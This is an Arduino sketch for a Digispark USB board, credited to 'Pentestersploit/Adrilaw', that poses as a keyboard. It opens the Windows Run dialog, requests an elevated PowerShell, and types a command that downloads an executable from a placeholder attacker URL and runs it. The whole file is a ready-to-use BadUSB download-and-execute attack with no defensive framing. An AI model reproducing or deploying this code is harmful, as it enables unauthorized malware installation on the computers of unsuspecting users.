//Opens a powershell and downloads payload from attackers webserver and executes it
// Created by: Pentestersploit/Adrilaw https://github.com/Adrilaw
#include "DigiKeyboard.h"



void loop() {}

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  // start of script
  // undefined
  // let the HID enumerate
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  // my best attempt at a elevated powershell instance
  DigiKeyboard.print(F("powershell Start-Process powershell -Verb runAs"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print(F("$down = New-Object System.Net.Webclient; $url = 'http://link/nameofpayload.exe'; $file = 'nameofpayload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
